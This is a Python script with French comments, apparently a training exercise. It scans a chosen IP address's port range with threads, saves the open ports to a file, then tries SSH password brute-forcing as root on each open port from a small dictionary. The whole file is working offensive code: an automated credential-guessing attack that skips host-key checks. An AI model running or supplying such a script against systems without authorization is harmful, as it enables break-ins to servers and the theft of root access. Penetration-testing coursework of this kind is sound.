import threading
import socket
from paramiko import SSHClient, AutoAddPolicy


# Définir une fonction qui va tester un port spécifique
def scan_port(host, port):
    try:
        # Création d'un objet socket
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        # Définir un délai pour éviter le TIMEOUT et le blocage
        s.settimeout(1)
        # Tentative de connexion sur le port (0 si la connexion a réussi)
        result = s.connect_ex((host, port))
        # Si le port est ouvert (result == 0), on l'affiche et on l'ajoute à la liste
        if result == 0:
            print(f"[+] Port {port} is open")
            with open("open_ports.txt", "a") as file:
                file.write(f"{port}\n")  # Enregistre les ports ouverts dans un fichier
        # On ferme le socket
        s.close()
    except Exception as e:
        # Gestion des erreurs
        print(f"[-] Erreur sur le port {port}: {e}")


# Fonction pour effectuer une attaque brute force SSH avec un mot de passe du dictionnaire
def brute_force_attack(host, port, dictionary):
    try:
        # Initialisation du client SSH
        client = SSHClient()
        client.set_missing_host_key_policy(AutoAddPolicy())  # Ignorer les clés hôtes inconnues
        print(f"[*] Tentative de connexion sur le port {port} avec les mots de passe du dictionnaire...")

        # Essayer chaque mot de passe du dictionnaire
        for password in dictionary:
            print(f"[*] Tentative avec le mot de passe '{password}'...")
            try:
                # Tentative de connexion avec chaque mot de passe du dictionnaire
                client.connect(host, port=port, username="root", password=password)
                print(f"[+] Connexion réussie sur {host}:{port} avec le mot de passe '{password}'")
                client.close()  # Fermer la connexion
                break  # Si la connexion réussit, on sort de la boucle
            except Exception as e:
                print(f"[-] Échec de la connexion sur {host}:{port} avec le mot de passe '{password}'")
                pass  # On ignore les erreurs et continue
    except Exception as e:
        print(f"[-] Échec de la tentative de connexion sur {host}:{port}: {e}")


# Demander à l'utilisateur l'adresse IP de la cible
target = input("Entrez l'adresse IP à scanner: ")

# Demander la plage de ports à scanner
start_port = int(input("Port de début: "))
end_port = int(input("Port de fin: "))

# Informer l'utilisateur qu'on commence le scan
print(f"\n[***] Scan de la cible {target} sur les ports {start_port} à {end_port} [***]\n")

# Liste des threads
threads = []

# Lancer un thread pour chaque port
for port in range(start_port, end_port + 1):
    t = threading.Thread(target=scan_port, args=(target, port))
    threads.append(t)
    t.start()

# Attendre que tous les threads finissent
for t in threads:
    t.join()

# Créer un dictionnaire avec les mots de passe
dictionary = ["Doranco"]  # Ajouter ici d'autres mots de passe si nécessaire

# Si le fichier "open_ports.txt" existe, essayer une attaque brute force sur les ports ouverts
try:
    with open("open_ports.txt", "r") as file:
        ports = file.readlines()
        for port in ports:
            port = port.strip()  # Enlever les espaces et retours à la ligne
            brute_force_attack(target, int(port), dictionary)
except FileNotFoundError:
    print("Aucun port ouvert trouvé. Assurez-vous d'avoir effectué un scan au préalable.")

print("\nScan terminé.")
